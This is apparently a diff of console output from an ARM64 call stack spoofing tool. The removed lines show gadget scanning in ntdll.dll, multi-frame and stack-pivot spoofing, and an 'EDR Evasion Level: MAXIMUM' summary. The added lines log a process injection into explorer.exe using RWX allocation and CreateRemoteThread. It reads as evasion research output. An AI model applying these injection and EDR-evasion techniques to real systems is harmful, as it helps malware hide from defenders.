@@ -1,170 +1,33 @@
-C:\Users\admin\Desktop\lab\ARM64-CallStackSpoofing>stack_spoof.exe
-
 ================================================================================
-                      ARM64 Call Stack Spoofing Framework
-                          Alexander Hagenah (@xaitax)
+  SCENARIO 1: BASELINE -- DIRECT INJECTION (NO SPOOFING)
 ================================================================================
 
-System Information:
-  * Process ID:        5280
-  * Thread ID:         4552
-  * Architecture:      ARM64
-  * Processor Count:   2
-  * Page Size:         0x1000 bytes
+[INFO] Direct call to InjectExplorer -- no stack manipulation
+[INFO] Expected: EDR sees real call chain, stack_spoof.exe attributed
 
-[INFO] Initializing symbol handler...
-[SUCCESS] Symbol handler initialized
-[INFO] Building gadget cache from system modules...
-[INFO] Scanning module: ntdll.dll (Base: 0x00007FFF4ABB0000)
-[INFO] Scanning .text section (Size: 3085749 bytes)
-[SUCCESS] Discovered 512 call-site gadgets in ntdll.dll
-[INFO] First gadget: 0x00007FFF4ABB2EF0 | Last gadget: 0x00007FFF4ABBB658
+  [>] Executing concealed function: InjectExplorer
+      Target: explorer.exe -- full injection pattern
 
-================================================================================
-  SCENARIO 1: BASELINE - DIRECT FUNCTION INVOCATION
-================================================================================
+  [STACK TRACE] From inside InjectExplorer (user-mode view):
+      [00] InjectExplorer                           + 0x0060 <-- TARGET
+      [01] mainCRTStartup                           + 0x0014
+      [02] BaseThreadInitThunk                      + 0x0040
+      [03] RtlUserThreadStart                       + 0x0044
+  [>] Found explorer.exe PID: 4872
+  [>] OpenProcess handle: 0x0000000000000140
+  [>] VirtualAllocEx RWX at: 0x0000000000920000
+  [>] WriteProcessMemory: 16 bytes written
+  [>] CreateRemoteThread: TID handle 0x0000000000000148
 
-[INFO] Establishing baseline with direct function call
-[INFO] Expected: Full call stack visible to security tools
+  [>] Injection complete -- payload executed in explorer.exe
 
-  [>] Executing concealed function
-      Parameter: 0x11111111
+[SUCCESS] Baseline injection completed in 153644 ms
 
-  [STACK TRACE] From inside concealed function:
-      [00] SecretFunction                   + 0x0078 <-- TARGET
-      [01] mainCRTStartup                   + 0x0014
-      [02] BaseThreadInitThunk              + 0x0040
-      [03] RtlUserThreadStart               + 0x0044
-
-  [>] Operation complete (Result: 0xCFBCAFFE)
-
-[SUCCESS] Direct execution completed in 3 ms
-[INFO] Result: 0xCFBCAFFE
-
-================================================================================
-  SCENARIO 2: SINGLE-FRAME CALL STACK SPOOFING
-================================================================================
-[DEBUG] Selected gadget[420/512]: 0x00007FFF4ABBA1D4
-
-[INFO] Executing with spoofed return address
-[INFO] Gadget source: ntdll.dll
-[INFO] Spoofed return: 0x00007FFF4ABBA1D4
-
-  [>] Executing concealed function
-      Parameter: 0x22222222
-
-  [STACK TRACE] From inside concealed function:
-      [00] SecretFunction                   + 0x0078 <-- TARGET
-      [01] RtlDefaultNpAcl                  + 0x0054
-      [02] main                             + 0x03B0
-      [03] mainCRTStartup                   + 0x0014
-      [04] BaseThreadInitThunk              + 0x0040
-      [05] RtlUserThreadStart               + 0x0044
-
-  [>] Operation complete (Result: 0xFC8F9CCD)
-
-[SUCCESS] Spoofed execution completed in 0 ms
-[INFO] Result: 0xFC8F9CCD
-[DEBUG] Real return address was: 0x00007FF71DFECF50
-
-================================================================================
-  SCENARIO 3: TRUE MULTI-FRAME CALL CHAIN SPOOFING
-================================================================================
-
-[INFO] Building TRUE 3-frame deep call chain using recursive spoofing
-[INFO] This technique creates real frames with spoofed return addresses
-
-  Multi-frame chain composition:
-[DEBUG] Selected gadget[453/512]: 0x00007FFF4ABBA898
-    Frame[0]: 0x00007FFF4ABBA898 (RtlDestroyQueryDebugBuffer+0x38)
-[DEBUG] Selected gadget[70/512]: 0x00007FFF4ABB44E0
-    Frame[1]: 0x00007FFF4ABB44E0 (LdrControlFlowGuardEnforced+0x190)
-[DEBUG] Selected gadget[449/512]: 0x00007FFF4ABBA7E4
-    Frame[2]: 0x00007FFF4ABBA7E4 (RtlCreateQueryDebugBuffer+0x1D4)
-
-[INFO] Executing with 3 levels of recursion, each with spoofed return
-
-  [>] Executing concealed function
-      Parameter: 0x33333333
-
-  [STACK TRACE] From inside concealed function:
-      [00] SecretFunction                   + 0x0078 <-- TARGET
-      [01] RtlCreateQueryDebugBuffer        + 0x01D4
-      [02] RecursiveSpoofHelper             + 0x0064
-      [03] LdrControlFlowGuardEnforced      + 0x0190
-      [04] RecursiveSpoofHelper             + 0x0064
-      [05] RtlDestroyQueryDebugBuffer       + 0x0038
-      [06] RecursiveSpoofHelper             + 0x0064
-      [07] mainCRTStartup                   + 0x0014
-      [08] BaseThreadInitThunk              + 0x0040
-      [09] RtlUserThreadStart               + 0x0044
-
-  [>] Operation complete (Result: 0xED9E8DDC)
-
-[SUCCESS] TRUE multi-frame execution completed in 0 ms
-[INFO] Result: 0xED9E8DDC
-[INFO] Expected: 3 spoofed frames should appear in the call stack
-
-================================================================================
-  SCENARIO 4: STACK PIVOTING & EXECUTION ISOLATION
-================================================================================
-
-[INFO] Preparing isolated execution environment
-[SUCCESS] Allocated 64 KB isolated stack at 0x0000022482F60000
-[DEBUG] Selected gadget[327/512]: 0x00007FFF4ABB8580
-[INFO] Fake frame configuration:
-      FP: 0x0000022482F6FF00
-      LR: 0x00007FFF4ABB8580
-      SP: 0x0000022482F70000
-
-  [>] Executing concealed function
-      Parameter: 0x44444444
-
-  [>] Operation complete (Result: 0x9AE9FAAB)
-
-[SUCCESS] Isolated execution completed in 0 ms
-[INFO] Result: 0x9AE9FAAB
-[INFO] Stack isolation prevented normal stack walking
-[DEBUG] Released isolated stack memory
-
-================================================================================
-  SCENARIO 5: SPOOFED PROCESS LAUNCH VIA STACK PIVOTING
-================================================================================
-
-[INFO] Preparing isolated execution environment for process launch
-[INFO] Goal: Launch notepad.exe from a concealed call stack
-[SUCCESS] Allocated 64 KB isolated stack at 0x0000022482F60000
-[DEBUG] Selected gadget[510/512]: 0x00007FFF4ABBB650
-[INFO] Fake frame configuration:
-      FP: 0x0000022482F6FF00
-      LR: 0x00007FFF4ABBB650
-      SP: 0x0000022482F70000
-
-  [>] Executing concealed function: LaunchNotepad
-  [>] Successfully launched notepad.exe (PID: 5660)
-
-  [>] Operation complete
-
-[SUCCESS] Isolated process launch completed in 105 ms
-[DEBUG] Released isolated stack memory
-
-================================================================================
-  EXECUTION STATISTICS
-================================================================================
-
-  Performance Metrics:
-    * Total Executions:     5
-    * Baseline Tests:       1
-    * Spoofing Attempts:    4
-    * Successful Spoofs:    4
-    * Gadgets Discovered:   512
-    * Average Exec Time:    21 ms
-    * Spoofing Success:     100.0%
-
-  Security Analysis:
-    * EDR Evasion Level:    MAXIMUM (All spoofing techniques successful)
-    * Detection Surface:    MINIMAL (Maximum gadget entropy: 512 gadgets)
-    * Technique Coverage:   Single-Frame | Multi-Frame | Stack Pivot | Process Launch
-
-[SUCCESS] All scenarios completed successfully
-[INFO] Final concealed value: 0x9AE9FAAB
+Notes:
+- ntdll.dll base (this run): 0x00007FFE81EF0000
+- stack_spoof.exe base (this run): 0x00007FF6C03F0000
+- CaptureStackBackTrace (CBT) shows only 4 frames: TestInjectionBaseline is
+  inlined by MSVC /O2; TestInjectionSingleFrame and main are absent from x29
+  chain because CBT walks frame pointer chain, not .pdata.
+- Timing (153644 ms) dominated by SymFromAddr online symbol resolution on
+  first call; not relevant to evasion analysis.
